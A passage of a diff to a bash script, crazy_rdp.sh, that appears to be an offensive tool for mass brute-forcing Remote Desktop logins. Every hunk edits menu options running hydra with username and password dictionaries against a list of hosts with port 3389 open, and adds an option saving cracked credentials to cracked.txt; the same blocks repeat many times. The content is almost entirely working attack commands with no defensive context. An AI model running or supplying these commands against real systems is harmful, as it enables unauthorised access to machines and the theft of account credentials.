-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1336,7 +1336,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1380,7 +1380,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1390,7 +1390,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1400,7 +1400,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1409,7 +1409,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1453,7 +1453,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1463,7 +1463,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1473,7 +1473,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1482,7 +1482,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1526,7 +1526,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1536,7 +1536,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1546,7 +1546,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1555,7 +1555,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1599,7 +1599,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1609,7 +1609,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1619,7 +1619,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1628,7 +1628,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1672,7 +1672,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1682,7 +1682,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1692,7 +1692,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1701,7 +1701,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1745,7 +1745,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1755,7 +1755,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1765,7 +1765,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1774,7 +1774,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1818,7 +1818,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1828,7 +1828,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1838,7 +1838,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1847,7 +1847,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1891,7 +1891,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1901,7 +1901,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1911,7 +1911,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1920,7 +1920,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1963,7 +1963,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1973,7 +1973,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1983,7 +1983,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -1992,7 +1992,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2035,7 +2035,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2045,7 +2045,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2055,7 +2055,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2064,7 +2064,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2107,7 +2107,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2117,7 +2117,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2127,7 +2127,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2136,7 +2136,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2180,7 +2180,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2190,7 +2190,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2200,7 +2200,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2209,7 +2209,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2252,7 +2252,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2262,7 +2262,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2272,7 +2272,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2281,7 +2281,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2325,7 +2325,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2335,7 +2335,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2345,7 +2345,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2354,7 +2354,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2398,7 +2398,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2408,7 +2408,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2418,7 +2418,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2427,7 +2427,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2471,7 +2471,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -2481,7 +2481,7 @@ fi
 if [ $brutmenu = "2" ]; then
